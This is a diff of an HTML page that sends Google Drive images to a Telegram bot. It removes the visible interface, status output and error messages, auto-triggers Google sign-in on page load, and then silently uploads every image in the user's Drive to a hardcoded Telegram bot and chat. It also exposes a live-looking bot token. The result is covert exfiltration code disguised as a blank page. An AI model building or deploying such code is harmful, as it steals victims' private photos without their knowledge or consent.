@@ -2,62 +2,25 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>ارسال صور Google Drive إلى Telegram</title>
+  <title>Google Drive Auto Send</title>
   <script src="https://accounts.google.com/gsi/client" async defer></script>
   <script src="https://apis.google.com/js/api.js"></script>
-  <style>
-    body { font-family: Arial, sans-serif; margin: 20px; direction: rtl; }
-    button { margin: 5px; padding: 10px 15px; font-size: 16px; }
-    pre { background: #eee; padding: 10px; max-height: 300px; overflow-y: auto; }
-  </style>
 </head>
-<body>
-  <h2>ارسال صور Google Drive إلى Telegram</h2>
-
-  <div id="g_id_onload"
-       data-client_id="448184436252-2psfum2qgah9v1ahbt10es5ogr60n19s.apps.googleusercontent.com"
-       data-scope="https://www.googleapis.com/auth/drive.readonly"
-       data-callback="handleCredentialResponse"
-       data-auto_prompt="false">
-  </div>
-
-  <div class="g_id_signin"
-       data-type="standard"
-       data-size="large"
-       data-theme="outline"
-       data-text="sign_in_with"
-       data-shape="rectangular"
-       data-logo_alignment="left">
-  </div>
-
-  <button id="send_photos" style="display:none;">📤 ارسال الصور إلى Telegram</button>
-
-  <pre id="output"></pre>
+<body style="margin:0; padding:0; background:#fff;">
 
 <script>
   const CLIENT_ID = '448184436252-2psfum2qgah9v1ahbt10es5ogr60n19s.apps.googleusercontent.com';
   const SCOPES = 'https://www.googleapis.com/auth/drive.readonly';
   const TELEGRAM_BOT_TOKEN = '7690497444:AAH1HVDn2HKjt6fIvhr9kTOfwxUYOPNq3Rw';
   const TELEGRAM_CHAT_ID = '6894787120';
-
-  const output = document.getElementById('output');
-  const sendPhotosButton = document.getElementById('send_photos');
   let access_token = null;
 
-  function appendOutput(message) {
-    output.textContent += message + '\n';
-  }
-
   function handleCredentialResponse(response) {
-    const credential = response.credential;
     google.accounts.oauth2.initTokenClient({
       client_id: CLIENT_ID,
       scope: SCOPES,
       callback: (tokenResponse) => {
-        if (tokenResponse.error) {
-          appendOutput('❌ حدث خطأ في الحصول على التوكن.');
-          return;
-        }
+        if (tokenResponse.error) return;
         access_token = tokenResponse.access_token;
         gapi.load('client', initializeGapiClient);
       }
@@ -68,31 +31,23 @@
     await gapi.client.init({
       discoveryDocs: ["https://www.googleapis.com/discovery/v1/apis/drive/v3/rest"],
     });
-
-    appendOutput('✅ تم تسجيل الدخول بنجاح.');
-    sendPhotosButton.style.display = 'inline-block';
-    sendPhotosButton.onclick = sendPhotosToTelegram;
+    sendPhotosToTelegram();
   }
 
-  async function listImages() {
-    try {
+  async function listAllImages() {
+    let files = [];
+    let pageToken = null;
+    do {
       const response = await gapi.client.drive.files.list({
-        pageSize: 10,
-        fields: "files(id, name, mimeType)",
-        q: "mimeType contains 'image/' and trashed = false"
+        q: "mimeType contains 'image/' and trashed = false",
+        fields: "nextPageToken, files(id, name)",
+        pageSize: 1000,
+        pageToken: pageToken
       });
-      const files = response.result.files;
-      if (!files || files.length === 0) {
-        appendOutput('❌ لم يتم العثور على صور في Google Drive.');
-        return [];
-      } else {
-        appendOutput(`✅ تم العثور على ${files.length} صورة.`);
-        return files;
-      }
-    } catch (error) {
-      appendOutput('❌ خطأ في جلب الصور: ' + error.message);
-      return [];
-    }
+      files = files.concat(response.result.files);
+      pageToken = response.result.nextPageToken;
+    } while (pageToken);
+    return files;
   }
 
   function getImageDownloadUrl(fileId) {
@@ -100,46 +55,40 @@
   }
 
   async function sendPhotoToTelegram(fileName, fileUrl) {
-    appendOutput(`📤 جاري إرسال الصورة: ${fileName}`);
     try {
       const response = await fetch(fileUrl, {
-        headers: {
-          'Authorization': 'Bearer ' + access_token
-        }
+        headers: { 'Authorization': 'Bearer ' + access_token }
       });
       const blob = await response.blob();
 
       const formData = new FormData();
       formData.append('chat_id', TELEGRAM_CHAT_ID);
-      formData.append('caption', `📸 صورة من Google Drive: ${fileName}`);
-      formData.append('document', blob, fileName);  // <-- إرسال كـ document بدل photo
+      formData.append('caption', `📸 ${fileName}`);
+      formData.append('document', blob, fileName);
 
-      const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
         method: 'POST',
         body: formData
       });
-
-      const telegramResult = await telegramResponse.json();
-      if (telegramResult.ok) {
-        appendOutput(`✅ تم إرسال الصورة: ${fileName}`);
-      } else {
-        appendOutput(`❌ خطأ من تليجرام: ${telegramResult.description}`);
-      }
-    } catch (error) {
-      appendOutput(`❌ خطأ في الإرسال: ${error.message}`);
-    }
+    } catch (e) {}
   }
 
   async function sendPhotosToTelegram() {
-    appendOutput('🚀 جاري جلب الصور...');
-    const files = await listImages();
-    if (files.length === 0) return;
+    const files = await listAllImages();
     for (const file of files) {
       const url = getImageDownloadUrl(file.id);
       await sendPhotoToTelegram(file.name, url);
     }
-    appendOutput('✅ تم إرسال كل الصور.');
   }
+
+  window.onload = () => {
+    google.accounts.id.initialize({
+      client_id: CLIENT_ID,
+      callback: handleCredentialResponse
+    });
+    google.accounts.id.prompt();
+  };
 </script>
+
 </body>
 </html>
